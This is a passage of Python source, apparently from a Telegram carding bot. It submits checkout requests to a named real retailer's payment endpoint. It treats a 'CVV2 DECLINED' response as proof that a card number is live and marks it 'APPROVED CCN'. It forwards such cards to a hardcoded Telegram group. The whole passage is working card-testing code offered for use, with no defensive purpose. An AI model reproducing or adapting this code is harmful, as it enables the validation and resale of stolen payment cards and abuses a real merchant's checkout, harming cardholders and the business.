            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            '__RequestVerificationToken': verftoken,
            'AdditionalInstructions': '',
            'nextstep': '',
        }

        response = session.post('https://www.brewsterwallcovering.com/checkout/confirm', headers=headers, data=data).text
        
        part1 = parseX(response, '<div class="message-error">', '</ul>')
        code = parseX(part1, '<li>', '</li>')
        
   
        if "Payment error: CVV2 DECLINED" in code:
            msg = "APPROVED CCN✅"
            respuesta = "Payment error: CVV2 DECLINED"

        else:
            msg = "DECLINED ❌"
            respuesta = code 
    except:
        msg = "DECLINED ❌"
        respuesta = "Ha ocurrido un error"
    
    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    if "APPROVED" in msg:
        
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
    return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    
    